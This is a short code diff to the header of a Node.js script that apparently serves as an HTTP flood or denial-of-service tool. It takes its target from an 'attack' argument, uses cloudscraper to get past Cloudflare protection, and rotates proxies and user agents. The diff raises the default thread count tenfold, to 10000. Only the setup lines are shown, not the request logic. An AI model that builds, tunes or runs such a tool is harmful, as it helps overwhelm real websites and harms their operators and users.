@@ -1,12 +1,12 @@
 'use strict';
-require('events').EventEmitter.prototype._maxListeners = 100;
+require('events').EventEmitter.prototype._maxListeners = 200;
 var HttpsProxyAgent = require('https-proxy-agent');
 const cloudscraper = require('cloudscraper');
 const args = require('minimist')(process.argv.slice(2));
 const fs = require('fs');
 const userAgents = require('./userAgents').userAgents();
 const site = args['attack'];
-const threads = args['threads'] || 1000;
+const threads = args['threads'] || 10000;
 const proxy = args['proxy'] == "true";
 const updateproxy = args['updateproxy'] == "true";
 const checkproxy = true;
